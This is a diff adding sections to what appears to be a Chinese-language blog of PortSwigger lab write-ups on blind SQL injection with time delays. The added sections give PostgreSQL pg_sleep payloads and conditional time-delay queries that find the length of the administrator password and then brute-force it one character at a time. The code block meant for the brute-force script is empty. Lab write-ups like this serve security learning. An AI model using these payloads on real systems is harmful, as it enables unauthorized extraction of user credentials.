@@ -503,4 +503,54 @@ P.S. 解完這題之後，回頭看 Solution，發現真的有限制 trackingId 
 Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
 ```
 
+### Lab: Blind SQL injection with time delays
+
+這題主要應該是要猜用什麼 DB，嘗試很多次，最終猜到是 PostgreSQL
+
+```sql
+' OR (SELECT pg_sleep(10)) IS NOT NULL--
+```
+
+### Lab: Blind SQL injection with time delays and information retrieval
+
+承接上一題，我猜這題也是用 PostgreSQL，我覺得最麻煩的是不同 SQL Database 的語法不一樣
+
+我們分析一下這段 SQL，這在 PostgreSQL 會出錯，因為 OR 條件的結果不是 Boolean
+
+```sql
+SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--'
+```
+
+所以我們可以用 [String concatenation](https://portswigger.net/web-security/sql-injection/cheat-sheet#string-concatenation) 的方式
+
+```sql
+SELECT * FROM tracking WHERE id = '' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--'
+```
+
+或者讓 `OR` 的條件變成 Boolean
+
+```sql
+SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL--'
+```
+
+老實說，在 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 幾乎是可以找到大部分題目的答案或 Hint 語法，我覺得最難的地方就是，要怎麼把這些看似正常的使用方法，用駭客的思維去組合測試
+
+既然已經確定 [Conditional time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#conditional-time-delays) 可行，接下來就是把條件改成測試密碼的長度
+
+```sql
+SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 20) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL--'
+```
+
+再來開始爆破密碼，構造以下 SQL
+
+```sql
+SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm' THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL--'
+```
+
+稍微修改 [Lab: Blind SQL injection with conditional errors](#lab-blind-sql-injection-with-conditional-errors) 的 NodeJS 程式碼
+
+```ts
+
+```
+
 ## 參考資料
